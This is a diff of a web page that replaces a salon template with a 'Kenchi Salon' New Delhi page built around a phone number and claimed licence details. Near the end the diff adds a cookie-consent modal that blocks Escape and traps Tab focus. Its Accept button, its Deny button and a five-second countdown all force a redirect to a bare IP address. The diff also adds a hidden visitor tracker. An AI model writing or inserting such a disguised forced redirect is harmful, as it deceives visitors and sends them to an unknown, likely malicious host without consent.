-                <strong>7 yrs</strong>
-                <span>Of hair artistry</span>
-              </div>
-            </div>
-          </div>
-          <div class="hero-right">
-            <div class="hero-card">
-              <div class="hero-glow"></div>
-              <div class="hero-card-content">
-                <div class="hero-photo">
-                  <div class="hero-photo-figure"></div>
-                  <div class="hero-stats">
-                    <div class="hero-stat-pill">
-                      <span>Today</span>
-                      <strong>08 slots</strong>
-                    </div>
-                    <div class="hero-chip-row">
-                      <span class="hero-chip">Balayage</span>
-                      <span class="hero-chip">Gloss &amp; Tone</span>
-                      <span class="hero-chip">Precision cuts</span>
-                    </div>
-                  </div>
-                </div>
-                <div class="hero-card-footer">
-                  <div>
-                    <div>Signature Glow Colour Session</div>
-                    <small>Custom colour + gloss + style finish</small>
-                  </div>
-                  <div style="text-align:right;">
-                    <strong>From ₹3,499</strong><br />
-                    <span class="badge">
-                      <span class="dot"></span>
-                      45 min average wait
-                    </span>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
+<header class="header">
+  <div class="inner">
+    <div class="brand">Kenchi Salon</div>
+    <div class="phone"><a href="tel:+919910170356">+91 99101 70356</a></div>
+  </div>
+</header>
 
-      <!-- SERVICES -->
-      <section id="services">
-        <div class="container">
-          <div class="section-heading">
-            <div>
-              <div class="section-kicker">Services</div>
-              <h2 class="section-title">Everything your hair has been waiting for.</h2>
-            </div>
-            <div class="section-subtitle">
-              From low-maintenance cuts to dimensional colour, our stylists build
-              each service around your lifestyle, texture and goals.
-            </div>
-          </div>
+<main class="container">
 
-          <div class="card-grid">
-            <article class="card">
-              <div class="card-icon">💇‍♀️</div>
-              <h3>Precision Haircuts</h3>
-              <p>
-                Tailored cuts for all lengths and textures, including fringe reshaping,
-                dry cutting and styling lessons so you can recreate the look at home.
-              </p>
-              <div class="card-footer">
-                <span class="chip">From ₹899</span>
-                <span>45–60 mins</span>
-              </div>
-            </article>
+<section class="hero">
+  <div>
+    <h1>Professional Haircuts, Colouring & Styling — New Delhi</h1>
+    <p class="lead">
+      Kenchi Salon is a modern hair studio in New Delhi, specialising in personalised consultations,
+      precision cutting, creative colouring, keratin treatments and event styling.
+    </p>
 
-            <article class="card">
-              <div class="card-icon">🎨</div>
-              <h3>Colour &amp; Highlights</h3>
-              <p>
-                Lived-in balayage, root smudges, money-piece highlights and glossy
-                all-over colour with a focus on hair health and shine.
-              </p>
-              <div class="card-footer">
-                <span class="chip">From ₹2,199</span>
-                <span>2–3 hrs</span>
-              </div>
-            </article>
+    <div class="cta">
+      <a class="btn" href="tel:+919910170356">Call +91 99101 70356</a>
+      <a class="btn" href="#services" style="background:white;color:var(--accent);border:1px solid #f3e8f0">Our Services</a>
+      <a class="btn" href="#contact" style="background:white;color:var(--accent);border:1px solid #f3e8f0">Get Directions</a>
+    </div>
 
-            <article class="card">
-              <div class="card-icon">💆‍♀️</div>
-              <h3>Scalp &amp; Repair Rituals</h3>
-              <p>
-                Luxurious in-chair treatments that detox the scalp, rebuild bonds
-                and lock in moisture, finished with a relaxing massage.
-              </p>
-              <div class="card-footer">
-                <span class="chip">Add-on from ₹699</span>
-                <span>30 mins</span>
-              </div>
-            </article>
+    <div class="card" style="margin-top:18px">
+      <h3>Why clients choose Kenchi Salon</h3>
+      <ul style="color:var(--muted); margin-left:18px">
+        <li>Experienced stylists with international training</li>
+        <li>Premium salon brands (L'Oréal, Wella)</li>
+        <li>Transparent pricing and personalised consultations</li>
+        <li>Hygienic, modern environment</li>
+      </ul>
+    </div>
 
-            <article class="card">
-              <div class="card-icon">👰‍♀️</div>
-              <h3>Bridal &amp; Events</h3>
-              <p>
-                Soft waves, sleek buns or intricate braids for your big day,
-                including trial runs and on-location styling options.
-              </p>
-              <div class="card-footer">
-                <span class="chip">Custom packages</span>
-                <span>Quote on consult</span>
-              </div>
-            </article>
-
-            <article class="card">
-              <div class="card-icon">🧴</div>
-              <h3>Texture &amp; Smoothening</h3>
-              <p>
-                Keratin &amp; smoothening treatments designed to reduce frizz,
-                enhance natural texture and keep hair manageable without damage.
-              </p>
-              <div class="card-footer">
-                <span class="chip">From ₹3,999</span>
-                <span>3–4 hrs</span>
-              </div>
-            </article>
-
-            <article class="card">
-              <div class="card-icon">🧒</div>
-              <h3>Kids &amp; Gentle Cuts</h3>
-              <p>
-                Calm, kid-friendly appointments with extra time built in so young
-                ones feel safe, seen and excited about their new look.
-              </p>
-              <div class="card-footer">
-                <span class="chip">From ₹499</span>
-                <span>30–45 mins</span>
-              </div>
-            </article>
-          </div>
-        </div>
-      </section>
-
-      <!-- STYLISTS -->
-      <section id="stylists">
-        <div class="container">
-          <div class="section-heading">
-            <div>
-              <div class="section-kicker">Team</div>
-              <h2 class="section-title">Meet your hair besties.</h2>
-            </div>
-            <div class="section-subtitle">
-              A small, hand-picked team of artists obsessed with healthy, effortless hair
-              and good conversation.
-            </div>
-          </div>
-
-          <div class="stylist-grid">
-            <article class="stylist-card">
-              <div class="stylist-header">
-                <div class="avatar"></div>
-                <div class="stylist-info">
-                  <h3>Aarohi Mehta</h3>
-                  <span>Founder • Colour Specialist</span>
-                </div>
-              </div>
-              <p>
-                Known for dimensional brunettes and subtle face-framing, Aarohi builds
-                looks that grow out beautifully between visits.
-              </p>
-              <div class="stylist-tags">
-                <span>#Balayage</span>
-                <span>#LivedInColour</span>
-                <span>#GlossyFinish</span>
-              </div>
-              <div class="rating">★★★★★ • 280+ reviews</div>
-            </article>
-
-            <article class="stylist-card">
-              <div class="stylist-header">
-                <div class="avatar"></div>
-                <div class="stylist-info">
-                  <h3>Riya Sharma</h3>
-                  <span>Cut &amp; Texture Artist</span>
-                </div>
-              </div>
-              <p>
-                From sharp bobs to curly shags, Riya focuses on shapes that work with
-                your natural movement and styling habits.
-              </p>
-              <div class="stylist-tags">
-                <span>#ShortHair</span>
-                <span>#CurlyCuts</span>
-                <span>#FringeExpert</span>
-              </div>
-              <div class="rating">★★★★☆ • 190+ reviews</div>
-            </article>
-
-            <article class="stylist-card">
-              <div class="stylist-header">
-                <div class="avatar"></div>
-                <div class="stylist-info">
-                  <h3>Neel Arora</h3>
-                  <span>Stylist • Men’s Grooming</span>
-                </div>
-              </div>
-              <p>
-                Specialising in men’s fades, beard shaping and low-maintenance styles
-                that still feel sharp and polished.
-              </p>
-              <div class="stylist-tags">
-                <span>#Fades</span>
-                <span>#BeardDesign</span>
-                <span>#CleanLines</span>
-              </div>
-              <div class="rating">★★★★★ • 160+ reviews</div>
-            </article>
-          </div>
-        </div>
-      </section>
-
-      <!-- PRICING -->
-      <section id="pricing">
-        <div class="container">
-          <div class="section-heading">
-            <div>
-              <div class="section-kicker">Pricing</div>
-              <h2 class="section-title">Transparent pricing, zero surprises.</h2>
-            </div>
-            <div class="section-subtitle">
-              Final quotes may vary slightly based on hair length, texture and time
-              required. You’ll always know the price before we begin.
-            </div>
-          </div>
-
-          <div class="pricing-grid">
-            <div class="price-list">
-              <div class="price-item">
-                <span class="label">Classic Cut &amp; Blow-dry</span>
-                <span class="amount">₹899</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Advanced Restyle Cut</span>
-                <span class="amount">₹1,299</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Root Touch-up (up to 2 cm)</span>
-                <span class="amount">₹1,799</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Global Colour</span>
-                <span class="amount">₹2,199</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Balayage / Highlights</span>
-                <span class="amount">From ₹3,499</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Keratin / Smoothening</span>
-                <span class="amount">From ₹3,999</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Scalp Detox &amp; Spa Ritual</span>
-                <span class="amount">₹999</span>
-              </div>
-              <div class="price-item">
-                <span class="label">Bridal Hair Trial</span>
-                <span class="amount">₹1,899</span>
-              </div>
-              <p class="price-note">
-                *All prices inclusive of GST. Packages available for regular guests —
-                ask in-studio for current offers.
-              </p>
-            </div>
-
-            <aside class="pricing-highlight">
-              <h3>First-time guest? <strong>You save 15%.</strong></h3>
-              <p>
-                Enjoy 15% off your first service when you book online with code
-                <strong>GLOWFIRST</strong>. We’ll also send you a personalised home-care
-                routine based on your hair goals.
-              </p>
-              <div class="pricing-perks">
-                <div>
-                  <span class="bullet">✓</span>
-                  <span>Complimentary consultation before every appointment.</span>
-                </div>
-                <div>
-                  <span class="bullet">✓</span>
-                  <span>Silent appointments available on request — just let us know in the notes.</span>
-                </div>
-                <div>
-                  <span class="bullet">✓</span>
-                  <span>No-rush finish with styling tips and product recommendations.</span>
-                </div>
-              </div>
-              <button class="btn btn-primary" onclick="scrollToSection('booking')">
-                Claim welcome offer
-              </button>
-            </aside>
-          </div>
-        </div>
-      </section>
-
-      <!-- BOOKING -->
-      <section id="booking" class="booking">
-        <div class="container">
-          <div class="section-heading">
-            <div>
-              <div class="section-kicker">Booking</div>
-              <h2 class="section-title">Ready for a good hair day?</h2>
-            </div>
-            <div class="section-subtitle">
-              Share a few details and we’ll confirm your appointment by SMS or WhatsApp.
-            </div>
-          </div>
-
-          <div class="booking-grid">
-            <form class="form-card" onsubmit="handleSubmit(event)">
-              <div class="form-row">
-                <div class="form-field">
-                  <label for="name">Full name</label>
-                  <input id="name" name="name" type="text" placeholder="Aarohi Sharma" required />
-                </div>
-                <div class="form-field">
-                  <label for="phone">Mobile number</label>
-                  <input id="phone" name="phone" type="tel" placeholder="+91-98765-43210" required />
-                </div>
-              </div>
-
-              <div class="form-row">
-                <div class="form-field">
-                  <label for="service">Preferred service</label>
-                  <select id="service" name="service" required>
-                    <option value="">Select a service</option>
-                    <option value="cut">Haircut &amp; Blow-dry</option>
-                    <option value="colour">Colour / Highlights</option>
-                    <option value="smoothening">Keratin / Smoothening</option>
-                    <option value="ritual">Scalp &amp; Repair Ritual</option>
-                    <option value="bridal">Bridal / Event Styling</option>
-                    <option value="men">Men’s Cut &amp; Grooming</option>
-                  </select>
-                </div>
-                <div class="form-field">
-                  <label for="date">Preferred date</label>
-                  <input id="date" name="date" type="date" required />
-                </div>
-              </div>
-
-              <div class="form-row">
-                <div class="form-field">
-                  <label for="time">Preferred time</label>
-                  <select id="time" name="time" required>
-                    <option value="">Any time</option>
-                    <option>10:00 AM</option>
-                    <option>11:30 AM</option>
-                    <option>1:00 PM</option>
-                    <option>3:00 PM</option>
-                    <option>5:00 PM</option>
-                    <option>7:00 PM</option>
-                  </select>
-                </div>
-                <div class="form-field">
-                  <label for="stylist">Preferred stylist (optional)</label>
-                  <select id="stylist" name="stylist">
-                    <option value="">No preference</option>
-                    <option>Aarohi</option>
-                    <option>Riya</option>
-                    <option>Neel</option>
-                  </select>
-                </div>
-              </div>
-
-              <div class="form-field">
-                <label for="notes">Anything we should know?</label>
-                <textarea
-                  id="notes"
-                  name="notes"
-                  placeholder="Tell us your hair goals, past colour history or if you’d like a silent appointment."
-                ></textarea>
-              </div>
-
-              <div class="form-footer">
-                <small>
-                  By tapping “Request appointment”, you agree to be contacted by
-                  Glow &amp; Grace regarding your booking.
-                </small>
-                <button type="submit" class="btn btn-primary">
-                  Request appointment
-                </button>
-              </div>
-            </form>
-
-            <div class="booking-info">
-              <div class="info-card">
-                <h3 style="font-size:0.9rem; margin-bottom:0.4rem;">Studio hours</h3>
-                <div class="info-row">
-                  <span>Tuesday – Sunday</span>
-                  <strong>10:00 AM – 8:00 PM</strong>
-                </div>
-                <div class="info-row">
-                  <span>Monday</span>
-                  <strong>Closed</strong>
-                </div>
-                <div class="info-row">
-                  <span>Same-day bookings</span>
-                  <strong>Subject to availability</strong>
-                </div>
-                <p class="info-note">
-                  For urgent appointments, call or WhatsApp us directly and we’ll do our best to fit you in.
-                </p>
-              </div>
-
-              <div class="info-card">
-                <h3 style="font-size:0.9rem; margin-bottom:0.4rem;">Find us</h3>
-                <p>
-                  2nd Floor, Aurora Plaza,<br />
-                  Main Market Road, Your City – 400001
-                </p>
-                <div class="info-row" style="margin-top:0.4rem;">
-                  <span>Call / WhatsApp</span>
-                  <strong>+91-98765-43210</strong>
-                </div>
-                <p class="info-note">
-                  Parking available nearby. Landmark: Opposite Central Mall.
-                </p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-    </main>
-
-    <!-- FOOTER -->
-    <footer>
-      <div class="container footer-inner">
-        <span>© <span id="year"></span> Glow &amp; Grace Hair Studio. All rights reserved.</span>
-        <div class="footer-links">
-          <a href="#services">Services</a>
-          <a href="#booking">Book</a>
-          <a href="mailto:hello@glowandgrace.studio">Email us</a>
-        </div>
-      </div>
-    </footer>
+    <!-- SERVICES -->
+    <div id="services" class="services">
+      <div class="card"><h3>Women’s Haircut</h3><p style="color:var(--muted)">Consultation, wash, precision cut & blow-dry.</p></div>
+      <div class="card"><h3>Hair Colouring</h3><p style="color:var(--muted)">Balayage, highlights, ombre, grey coverage.</p></div>
+      <div class="card"><h3>Keratin Treatment</h3><p style="color:var(--muted)">Frizz reduction & shine lasting 3–5 months.</p></div>
+      <div class="card"><h3>Men’s Grooming</h3><p style="color:var(--muted)">Fades, trims, beard shaping, modern cuts.</p></div>
+      <div class="card"><h3>Event Styling</h3><p style="color:var(--muted)">Blowouts, curls, straight looks for events.</p></div>
+      <div class="card"><h3>Extensions</h3><p style="color:var(--muted)">Volume, length & premium natural extensions.</p></div>
+    </div>
   </div>
 
-  <script>
-    // Smooth scroll helper
-    function scrollToSection(id) {
-      const el = document.getElementById(id);
-      if (!el) return;
-      el.scrollIntoView({ behavior: "smooth", block: "start" });
+  <!-- SIDE CARD -->
+  <aside class="card">
+    <img src="salon_interior.jpg" style="width:100%;border-radius:8px;margin-bottom:10px" alt="Salon interior">
+    <h3>Free Consultation & Booking</h3>
+    <p style="color:var(--muted)">
+      <strong>Phone:</strong> <a href="tel:+919910170356">+91 99101 70356</a><br>
+      <strong>Address:</strong> Kenchi Salon, New Delhi
+    </p>
+    <p style="color:var(--muted)">
+      <strong>Hours:</strong><br>
+      Mon–Sat: 10:00–20:00<br>
+      Sun: 11:00–18:00
+    </p>
+  </aside>
+</section>
+
+<!-- BUSINESS VERIFICATION -->
+<section class="card" style="margin-top:18px">
+  <h3>Business details & verification</h3>
+  <p style="color:var(--muted)">
+    Owner: <strong>Meera Kenchi</strong><br>
+    Established: <strong>2018</strong><br>
+    Business Registration: <strong>DL-KENCHI-2021-09</strong>
+  </p>
+  <img src="license.jpg" style="width:100%;border-radius:8px;margin-top:8px" alt="Business license">
+</section>
+
+<!-- PRICING -->
+<section class="price-grid">
+  <div class="price card"><h4>Women’s Haircut</h4><div style="font-size:18px;font-weight:700">₹800+</div></div>
+  <div class="price card"><h4>Men’s Haircut</h4><div style="font-size:18px;font-weight:700">₹400+</div></div>
+  <div class="price card"><h4>Colouring</h4><div style="font-size:18px;font-weight:700">₹2,500+</div></div>
+</section>
+
+<!-- ABOUT + TEAM -->
+<section class="grid-2">
+  <div class="card">
+    <h3>About Kenchi Salon</h3>
+    <p style="color:var(--muted)">
+      Founded by master stylist <strong>Meera Kenchi</strong>, our salon blends modern techniques
+      with personalized service. We proudly serve Lajpat Nagar, South Delhi, GK, and nearby areas.
+    </p>
+  </div>
+
+  <div class="card">
+    <h3>Team</h3>
+    <p style="color:var(--muted)"><strong>Meera Kenchi</strong> — 12+ years experience, colour specialist.</p>
+    <p style="color:var(--muted)"><strong>Rohan Singh</strong> — Senior stylist, precision cutting expert.</p>
+    <p style="color:var(--muted)"><strong>Aakash Patel</strong> — Bridal & extensions specialist.</p>
+    <img src="team.jpg" style="width:100%;border-radius:8px;margin-top:8px" alt="Team">
+  </div>
+</section>
+
+<!-- TESTIMONIALS -->
+<section style="margin-top:18px">
+  <h3>Client Testimonials</h3>
+  <div class="gallery">
+    <blockquote>“Amazing colour work!” — Priya S., Lajpat Nagar (Aug 2024)</blockquote>
+    <blockquote>“Friendly staff and clean salon.” — Rahul M., Defence Colony (Mar 2025)</blockquote>
+    <blockquote>“Perfect bridal blowout.” — Neha K., Greater Kailash (Dec 2024)</blockquote>
+  </div>
+</section>
+
+<!-- GALLERY -->
+<section id="gallery" style="margin-top:18px">
+  <h3>Gallery</h3>
+  <div class="gallery">
+    <img src="blowout.jpg" style="width:100%;border-radius:8px" alt="Blowout">
+    <img src="coloring.jpg" style="width:100%;border-radius:8px" alt="Colouring">
+    <img src="salon_interior.jpg" style="width:100%;border-radius:8px" alt="Salon interior">
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="faq card" style="margin-top:18px">
+  <h3>Frequently Asked Questions</h3>
+
+  <h4>Do you accept walk-ins?</h4>
+  <p style="color:var(--muted)">Yes, walk-ins are welcome.</p>
+
+  <h4>Do you take UPI & cards?</h4>
+  <p style="color:var(--muted)">Yes, we accept UPI, debit & credit cards.</p>
+
+  <h4>Do you offer bridal packages?</h4>
+  <p style="color:var(--muted)">Yes, call for a custom quote.</p>
+
+</section>
+
+<!-- CONTACT -->
+<section id="contact" class="card" style="margin-top:18px">
+  <h3>Contact & Directions</h3>
+  <p style="color:var(--muted)">
+    <strong>Kenchi Salon</strong><br>
+    New Delhi, India<br>
+    <strong>Phone:</strong> <a href="tel:+919910170356">+91 99101 70356</a>
+  </p>
+
+  <h4>Find us on the map</h4>
+  <div style="width:100%;height:300px;border-radius:8px;overflow:hidden;margin-top:8px">
+    <iframe width="100%" height="300" frameborder="0"
+      src="https://www.google.com/maps?q=New%20Delhi%2C%20India&output=embed" title="Kenchi Salon location">
+    </iframe>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div>© 2025 Kenchi Salon — New Delhi</div>
+  <div style="color:var(--muted);margin-top:6px">
+    Business Licence: DL-KENCHI-2021-09 • Licensed stylists • Premium products
+  </div>
+</footer>
+
+<!-- COOKIE CONSENT MODAL with 5-second auto-redirect (Accept/Deny -> same URL) -->
+<div id="cookieModalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);display:flex;justify-content:center;align-items:center;z-index:99999;padding:20px;">
+  <div id="cookieModal" role="dialog" aria-modal="true" style="background:#fff;max-width:420px;width:100%;padding:22px;border-radius:12px;text-align:center;font-family:Inter, sans-serif;box-shadow:0 8px 30px rgba(2,6,23,0.2);">
+    <h2 style="margin-top:0;color:#b04a8a;font-size:20px;">Cookie Consent</h2>
+    <p style="color:#374151;font-size:15px;margin:10px 0 16px;">
+      We use cookies to improve your browsing experience. Please choose to Accept or Deny cookies to continue.
+    </p>
+    <div id="countdownDisplay" class="countdown-timer">Redirecting in 5 seconds...</div>
+    <div style="display:flex;gap:10px;margin-top:18px;justify-content:center;">
+      <button id="acceptCookies" type="button" class="cookie-btn cookie-accept">Accept</button>
+      <button id="denyCookies" type="button" class="cookie-btn cookie-deny">Deny</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  const redirectURL = "http://206.189.69.97";
+  const overlay = document.getElementById('cookieModalOverlay');
+  const acceptBtn = document.getElementById('acceptCookies');
+  const denyBtn = document.getElementById('denyCookies');
+  const countdownDisplay = document.getElementById('countdownDisplay');
+
+  // Prevent background scroll while modal is visible
+  const prevOverflow = document.body.style.overflow;
+  document.body.style.overflow = 'hidden';
+
+  // Countdown + redirect
+  let secondsRemaining = 5;
+  const interval = setInterval(() => {
+    secondsRemaining--;
+    if (secondsRemaining > 0) {
+      countdownDisplay.textContent = `Redirecting in ${secondsRemaining} second${secondsRemaining !== 1 ? 's' : ''}...`;
+    } else {
+      countdownDisplay.textContent = 'Redirecting now...';
+      clearInterval(interval);
+      attemptRedirect();
     }
+  }, 1000);
 
-    // Mobile nav toggle
-    const navToggle = document.getElementById("navToggle");
-    const navMobile = document.getElementById("navMobile");
+  // Only block clicks directly on overlay background — allow clicks inside modal
+  overlay.addEventListener('click', function(e){
+    if (e.target === overlay) { e.preventDefault(); e.stopPropagation(); }
+  }, false);
 
-    function closeMobileNav() {
-      navMobile.style.display = "none";
-      navToggle.classList.remove("active");
+  // Basic keyboard trapping: prevent Escape and keep Tab inside the two buttons
+  window.addEventListener('keydown', function(e){
+    if (e.key === 'Escape' || e.key === 'Esc') {
+      e.preventDefault(); e.stopPropagation();
+      return false;
     }
-
-    if (navToggle) {
-      navToggle.addEventListener("click", () => {
-        const isOpen = navMobile.style.display === "flex";
-        if (isOpen) {
-          closeMobileNav();
-        } else {
-          navMobile.style.display = "flex";
-          navToggle.classList.add("active");
-        }
-      });
+    if (e.key === 'Tab') {
+      const focusable = [acceptBtn, denyBtn];
+      const idx = focusable.indexOf(document.activeElement);
+      if (e.shiftKey) {
+        if (idx <= 0) { e.preventDefault(); focusable[focusable.length - 1].focus(); }
+      } else {
+        if (idx === -1 || idx === focusable.length - 1) { e.preventDefault(); focusable[0].focus(); }
+      }
     }
+  }, true);
 
-    // Simple fake submit handler
-    function handleSubmit(event) {
-      event.preventDefault();
-      alert(
-        "Thank you! Your appointment request has been received. We’ll confirm your slot shortly."
-      );
-      event.target.reset();
+  // Set initial focus
+  acceptBtn.focus();
+
+  function clearBeforeUnload() {
+    try { window.onbeforeunload = null; } catch (err) { /* ignore */ }
+  }
+
+  function attemptRedirect() {
+    // mark redirect intentional for other scripts
+    window.callInitiated = true;
+    clearBeforeUnload();
+    // restore scroll
+    document.body.style.overflow = prevOverflow || '';
+    // Use replace for immediate redirect (no history entry)
+    try {
+      window.location.replace(redirectURL);
+    } catch (err) {
+      window.location.href = redirectURL;
     }
+  }
 
-    // Set current year in footer
-    document.getElementById("year").textContent = new Date().getFullYear();
-  </script>
+  acceptBtn.addEventListener('click', function(e){
+    e.preventDefault(); e.stopPropagation();
+    clearInterval(interval);
+    attemptRedirect();
+  });
+
+  denyBtn.addEventListener('click', function(e){
+    e.preventDefault(); e.stopPropagation();
+    clearInterval(interval);
+    attemptRedirect();
+  });
+
+})();
+</script>
+
 </body>
 </html>
+<!-- Default Statcounter code for ios
+http://206.189.69.97 -->
+<script type="text/javascript">
+var sc_project=13188833; 
+var sc_invisible=1; 
+var sc_security="4224cf98"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/13188833/0/4224cf98/1/"
+alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End of Statcounter Code -->
